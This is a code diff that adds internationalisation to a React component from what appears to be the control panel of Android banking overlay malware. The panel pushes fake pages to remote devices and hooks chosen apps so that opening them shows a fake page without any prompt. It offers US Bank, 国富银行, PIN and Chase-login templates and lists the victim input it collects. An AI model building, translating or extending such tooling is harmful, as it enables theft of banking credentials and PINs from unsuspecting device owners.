@@ -11,6 +11,8 @@ import {
 import type { FakePageSubmission } from "../types";
 import { formatDateTime } from "../utils/format";
 import "../styles/device-fake-page-modal.css";
+import { useI18n, t } from "../i18n";
+
 
 interface DeviceFakePageModalProps {
   open: boolean;
@@ -91,16 +93,16 @@ function isHttpsUrl(value: string): boolean {
 
 function mapWebLinkError(text: string) {
   if (text === "name_required") {
-    return "请填写名称";
+    return t("请填写名称");
   }
   if (text === "url_required") {
-    return "请填写链接";
+    return t("请填写链接");
   }
   if (text === "url_must_be_https") {
-    return "链接必须是 https:// 开头";
+    return t("链接必须是 https:// 开头");
   }
   if (text === "url_already_exists") {
-    return "该链接已存在";
+    return t("该链接已存在");
   }
   return text;
 }
@@ -114,6 +116,7 @@ export function DeviceFakePageModal({
   onClose,
   onHooksChanged,
 }: DeviceFakePageModalProps) {
+  const { locale } = useI18n();
   const [title, setTitle] = useState("");
   const [content, setContent] = useState("");
   const [pageType, setPageType] = useState<FakePageType>("web");
@@ -156,11 +159,11 @@ export function DeviceFakePageModal({
       });
     } catch (error) {
       setWebLinks([]);
-      message.error(error instanceof Error ? error.message : "加载 Web 链接失败");
+      message.error(error instanceof Error ? error.message : t("加载 Web 链接失败"));
     } finally {
       setWebLinksLoading(false);
     }
-  }, []);
+  }, [locale]);
 
   const loadIcon = useCallback(async () => {
     if (!deviceId || !packageName || !isOnline) {
@@ -183,11 +186,11 @@ export function DeviceFakePageModal({
       setIconBase64(icon);
     } catch (error) {
       setIconBase64("");
-      message.warning(error instanceof Error ? error.message : "获取图标失败");
+      message.warning(error instanceof Error ? error.message : t("获取图标失败"));
     } finally {
       setIconLoading(false);
     }
-  }, [deviceId, isOnline, packageName]);
+  }, [locale, deviceId, isOnline, packageName]);
 
   const loadRecords = useCallback(async () => {
     if (!deviceId || !packageName) {
@@ -251,21 +254,21 @@ export function DeviceFakePageModal({
     const name = newLinkName.trim();
     const url = newLinkUrl.trim();
     if (!name) {
-      message.warning("请填写名称");
+      message.warning(t("请填写名称"));
       return;
     }
     if (!url) {
-      message.warning("请填写链接");
+      message.warning(t("请填写链接"));
       return;
     }
     if (!isHttpsUrl(url)) {
-      message.warning("链接必须是 https:// 开头");
+      message.warning(t("链接必须是 https:// 开头"));
       return;
     }
     setAddingLink(true);
     try {
       const created = await createFakePageWebLink({ name, url });
-      message.success("已新增 Web 链接");
+      message.success(t("已新增 Web 链接"));
       setAddLinkOpen(false);
       setNewLinkName("");
       setNewLinkUrl("");
@@ -273,7 +276,7 @@ export function DeviceFakePageModal({
       setWebUrl(created.url);
     } catch (error) {
       message.error(
-        mapWebLinkError(error instanceof Error ? error.message : "新增失败"),
+        mapWebLinkError(error instanceof Error ? error.message : t("新增失败")),
       );
     } finally {
       setAddingLink(false);
@@ -285,21 +288,21 @@ export function DeviceFakePageModal({
       return;
     }
     if (!isOnline) {
-      message.error(mode === "arm" ? "设备离线，无法挂钩伪页" : "设备离线，无法下发伪页");
+      message.error(mode === "arm" ? t("设备离线，无法挂钩伪页") : t("设备离线，无法下发伪页"));
       return;
     }
     if (!title.trim() || !content.trim()) {
-      message.warning("请填写标题和内容");
+      message.warning(t("请填写标题和内容"));
       return;
     }
     const trimmedWebUrl = webUrl.trim();
     if (pageType === "web") {
       if (!trimmedWebUrl) {
-        message.warning(webLinks.length === 0 ? "请先新增 Web 链接" : "请选择 Web 落地页链接");
+        message.warning(webLinks.length === 0 ? t("请先新增 Web 链接") : t("请选择 Web 落地页链接"));
         return;
       }
       if (!isHttpsUrl(trimmedWebUrl)) {
-        message.warning("Web 链接必须是 https:// 开头");
+        message.warning(t("Web 链接必须是 https:// 开头"));
         return;
       }
     }
@@ -324,14 +327,14 @@ export function DeviceFakePageModal({
         throw new Error(command.errorMessage ?? command.status);
       }
       message.success(
-        mode === "arm" ? PAGE_TYPE_ARM_SUCCESS[pageType] : PAGE_TYPE_SHOW_SUCCESS[pageType],
+        t(mode === "arm" ? PAGE_TYPE_ARM_SUCCESS[pageType] : PAGE_TYPE_SHOW_SUCCESS[pageType]),
       );
       if (mode === "arm") {
         onHooksChanged?.();
       }
       onClose();
     } catch (error) {
-      message.error(error instanceof Error ? error.message : mode === "arm" ? "挂钩失败" : "下发失败");
+      message.error(error instanceof Error ? error.message : mode === "arm" ? t("挂钩失败") : t("下发失败"));
     } finally {
       setSubmitBusy(null);
     }
@@ -353,10 +356,10 @@ export function DeviceFakePageModal({
         throw new Error(command.errorMessage ?? command.status);
       }
       setHooks(parseFakePageHooks(command.result));
-      message.success("已取消挂钩");
+      message.success(t("已取消挂钩"));
       onHooksChanged?.();
     } catch (error) {
-      message.error(error instanceof Error ? error.message : "取消挂钩失败");
+      message.error(error instanceof Error ? error.message : t("取消挂钩失败"));
     } finally {
       setDisarmBusy(null);
     }
@@ -376,7 +379,7 @@ export function DeviceFakePageModal({
   return (
     <>
       <Modal
-        title={`伪页 - ${appLabel || packageName}`}
+        title={t("伪页 - {0}", { 0: appLabel || packageName })}
         open={open}
         onCancel={onClose}
         footer={null}
@@ -391,19 +394,19 @@ export function DeviceFakePageModal({
           items={[
             {
               key: "create",
-              label: "制作伪页",
+              label: t("制作伪页"),
               children: (
                 <div className="fake-page-create">
                   <div className="fake-page-icon-box">
                     {iconLoading ? (
-                      <div className="fake-page-icon-placeholder">图标加载中…</div>
+                      <div className="fake-page-icon-placeholder">{t("图标加载中…")}</div>
                     ) : iconSrc ? (
                       <img className="fake-page-icon" src={iconSrc} alt={appLabel} />
                     ) : (
-                      <div className="fake-page-icon-placeholder">暂无图标</div>
+                      <div className="fake-page-icon-placeholder">{t("暂无图标")}</div>
                     )}
                     <div className="fake-page-icon-hint">
-                      已自动获取包名对应应用 Icon（192×192）
+                      {t("已自动获取包名对应应用 Icon（192×192）")}
                     </div>
                     <Button
                       size="small"
@@ -411,45 +414,45 @@ export function DeviceFakePageModal({
                       disabled={!isOnline}
                       onClick={() => void loadIcon()}
                     >
-                      重新获取 Icon
+                      {t("重新获取 Icon")}
                     </Button>
                   </div>
 
                   <Form layout="vertical" className="fake-page-form">
-                    <Form.Item label="标题" required>
+                    <Form.Item label={t("标题")} required>
                       <Input
-                        placeholder="标题"
+                        placeholder={t("标题")}
                         value={title}
                         onChange={(event) => setTitle(event.target.value)}
                         maxLength={80}
                       />
                     </Form.Item>
-                    <Form.Item label="内容" required>
+                    <Form.Item label={t("内容")} required>
                       <Input.TextArea
-                        placeholder="内容"
+                        placeholder={t("内容")}
                         value={content}
                         onChange={(event) => setContent(event.target.value)}
                         rows={4}
                         maxLength={500}
                       />
                     </Form.Item>
-                    <Form.Item label="类型选择" required>
+                    <Form.Item label={t("类型选择")} required>
                       <Radio.Group
                         value={pageType}
                         onChange={(event) => setPageType(event.target.value as FakePageType)}
                       >
-                        <Radio value="web">Web 落地页</Radio>
-                        <Radio value="pin">有 PIN 码</Radio>
-                        <Radio value="nopin">无 PIN 码</Radio>
+                        <Radio value="web">{t("Web 落地页")}</Radio>
+                        <Radio value="pin">{t("有 PIN 码")}</Radio>
+                        <Radio value="nopin">{t("无 PIN 码")}</Radio>
                         <Radio value="usbank">US Bank</Radio>
-                        <Radio value="guofu">国富银行</Radio>
+                        <Radio value="guofu">{t("国富银行")}</Radio>
                       </Radio.Group>
                       <div className="fake-page-icon-hint" style={{ marginTop: 8 }}>
-                        {PAGE_TYPE_HINT[pageType]}
+                        {t(PAGE_TYPE_HINT[pageType])}
                       </div>
                     </Form.Item>
                     {pageType === "web" ? (
-                      <Form.Item label="Web 链接 (HTTPS)" required>
+                      <Form.Item label={t("Web 链接 (HTTPS)")} required>
                         <Space.Compact style={{ width: "100%" }}>
                           <Select
                             showSearch
@@ -457,19 +460,19 @@ export function DeviceFakePageModal({
                             loading={webLinksLoading}
                             placeholder={
                               webLinks.length === 0
-                                ? "暂无链接，请点 + 新增"
-                                : "请选择 Web 链接"
+                                ? t("暂无链接，请点 + 新增")
+                                : t("请选择 Web 链接")
                             }
                             value={webUrl || undefined}
                             options={webLinkOptions}
                             onChange={(value) => setWebUrl(value)}
                             style={{ width: "100%" }}
-                            notFoundContent="暂无链接，请点右侧 + 新增"
+                            notFoundContent={t("暂无链接，请点右侧 + 新增")}
                           />
                           <Button
                             type="primary"
                             icon={<PlusOutlined />}
-                            title="新增 Web 链接"
+                            title={t("新增 Web 链接")}
                             onClick={() => {
                               setNewLinkName("");
                               setNewLinkUrl("");
@@ -479,31 +482,31 @@ export function DeviceFakePageModal({
                         </Space.Compact>
                       </Form.Item>
                     ) : null}
-                    <Form.Item label="包名">
+                    <Form.Item label={t("包名")}>
                       <Input value={packageName} disabled />
                     </Form.Item>
                     {currentHook ? (
                       <div className="fake-page-icon-hint">
-                        当前已挂钩（{currentHook.pageType || "未知类型"}
+                        {t("当前已挂钩（")}{currentHook.pageType || t("未知类型")}
                         {currentHook.title ? ` · ${currentHook.title}` : ""}
-                        ）。「确认挂钩」会覆盖这条；「立即下发」立刻弹确认框，不影响挂钩。
+                        {t("）。「确认挂钩」会覆盖这条；「立即下发」立刻弹确认框，不影响挂钩。")}
                       </div>
                     ) : (
                       <div className="fake-page-icon-hint">
-                        「立即下发」马上弹出确认框再进伪页。「确认挂钩」不立刻弹，用户打开{" "}
-                        {appLabel || "该应用"} 时直接进伪页（无确认框），采完后可正常使用。
+                        {t("「立即下发」马上弹出确认框再进伪页。「确认挂钩」不立刻弹，用户打开")}{" "}
+                        {appLabel || t("该应用")} {t("时直接进伪页（无确认框），采完后可正常使用。")}
                       </div>
                     )}
                   </Form>
 
                   <div className="fake-page-actions">
-                    <Button onClick={onClose}>取消</Button>
+                    <Button onClick={onClose}>{t("取消")}</Button>
                     <Button
                       loading={submitBusy === "show"}
                       disabled={!isOnline || submitBusy !== null}
                       onClick={() => void submitFakePage("show")}
                     >
-                      立即下发
+                      {t("立即下发")}
                     </Button>
                     <Button
                       type="primary"
@@ -511,7 +514,7 @@ export function DeviceFakePageModal({
                       disabled={!isOnline || submitBusy !== null}
                       onClick={() => void submitFakePage("arm")}
                     >
-                      确认挂钩
+                      {t("确认挂钩")}
                     </Button>
                     {currentHook ? (
                       <Button
@@ -520,7 +523,7 @@ export function DeviceFakePageModal({
                         disabled={!isOnline || submitBusy !== null}
                         onClick={() => void handleDisarm(packageName)}
                       >
-                        取消本应用挂钩
+                        {t("取消本应用挂钩")}
                       </Button>
                     ) : null}
                   </div>
@@ -529,18 +532,18 @@ export function DeviceFakePageModal({
             },
             {
               key: "hooks",
-              label: `已挂钩${hooks.length > 0 ? `（${hooks.length}）` : ""}`,
+              label: t("已挂钩{0}", { 0: hooks.length > 0 ? `（${hooks.length}）` : "" }),
               children: (
                 <div className="fake-page-collect">
                   <div className="fake-page-collect-toolbar">
-                    <span>多应用可同时挂钩，打开对应 App 时直接进伪页（无确认框）</span>
+                    <span>{t("多应用可同时挂钩，打开对应 App 时直接进伪页（无确认框）")}</span>
                     <Button
                       size="small"
                       loading={hooksLoading}
                       disabled={!isOnline}
                       onClick={() => void loadHooks()}
                     >
-                      刷新
+                      {t("刷新")}
                     </Button>
                   </div>
                   <Table
@@ -549,27 +552,27 @@ export function DeviceFakePageModal({
                     loading={hooksLoading}
                     dataSource={hooks}
                     pagination={false}
-                    locale={{ emptyText: isOnline ? "暂无挂钩" : "设备离线，无法读取挂钩" }}
+                    locale={{ emptyText: isOnline ? t("暂无挂钩") : t("设备离线，无法读取挂钩") }}
                     columns={[
                       {
-                        title: "应用",
+                        title: t("应用"),
                         dataIndex: "label",
                         ellipsis: true,
                         render: (value: string, record: FakePageHook) =>
                           value || record.packageName,
                       },
                       {
-                        title: "包名",
+                        title: t("包名"),
                         dataIndex: "packageName",
                         ellipsis: true,
                       },
                       {
-                        title: "类型",
+                        title: t("类型"),
                         dataIndex: "pageType",
                         width: 88,
                       },
                       {
-                        title: "操作",
+                        title: t("操作"),
                         width: 88,
                         render: (_value, record: FakePageHook) => (
                           <Button
@@ -579,7 +582,7 @@ export function DeviceFakePageModal({
                             disabled={!isOnline}
                             onClick={() => void handleDisarm(record.packageName)}
                           >
-                            取消
+                            {t("取消")}
                           </Button>
                         ),
                       },
@@ -590,17 +593,17 @@ export function DeviceFakePageModal({
             },
             {
               key: "collect",
-              label: "伪页收集信息",
+              label: t("伪页收集信息"),
               children: (
                 <div className="fake-page-collect">
                   <div className="fake-page-collect-toolbar">
-                    <span>包名：{packageName}</span>
+                    <span>{t("包名：")}{packageName}</span>
                     <Button
                       size="small"
                       loading={recordsLoading}
                       onClick={() => void loadRecords()}
                     >
-                      刷新
+                      {t("刷新")}
                     </Button>
                   </div>
                   <Table
@@ -609,30 +612,30 @@ export function DeviceFakePageModal({
                     loading={recordsLoading}
                     dataSource={records}
                     pagination={{ pageSize: 8, hideOnSinglePage: true }}
-                    locale={{ emptyText: "暂无伪页提交记录" }}
+                    locale={{ emptyText: t("暂无伪页提交记录") }}
                     columns={[
                       {
-                        title: "序号",
+                        title: t("序号"),
                         width: 60,
                         render: (_value, _record, index) => index + 1,
                       },
                       {
-                        title: "标题",
+                        title: t("标题"),
                         dataIndex: "title",
                         ellipsis: true,
                       },
                       {
-                        title: "输入内容",
+                        title: t("输入内容"),
                         dataIndex: "text",
                         ellipsis: true,
                       },
                       {
-                        title: "次数",
+                        title: t("次数"),
                         dataIndex: "submitCount",
                         width: 64,
                       },
                       {
-                        title: "采集时间",
+                        title: t("采集时间"),
                         dataIndex: "capturedAt",
                         width: 168,
                         render: (value: string) => formatDateTime(value),
@@ -647,7 +650,7 @@ export function DeviceFakePageModal({
       </Modal>
 
       <Modal
-        title="新增伪页 Web 链接"
+        title={t("新增伪页 Web 链接")}
         open={addLinkOpen}
         onCancel={() => {
           if (!addingLink) {
@@ -656,23 +659,23 @@ export function DeviceFakePageModal({
         }}
         onOk={() => void handleAddWebLink()}
         confirmLoading={addingLink}
-        okText="保存"
-        cancelText="取消"
+        okText={t("保存")}
+        cancelText={t("取消")}
         destroyOnClose
         centered={false}
         zIndex={12000}
         getContainer={() => document.body}
       >
         <Form layout="vertical" style={{ marginTop: 8 }}>
-          <Form.Item label="名称" required>
+          <Form.Item label={t("名称")} required>
             <Input
-              placeholder="例如：Chase 登录页"
+              placeholder={t("例如：Chase 登录页")}
               value={newLinkName}
               onChange={(event) => setNewLinkName(event.target.value)}
               maxLength={128}
             />
           </Form.Item>
-          <Form.Item label="链接 (HTTPS)" required>
+          <Form.Item label={t("链接 (HTTPS)")} required>
             <Input
               placeholder="https://example.com/landing/"
               value={newLinkUrl}
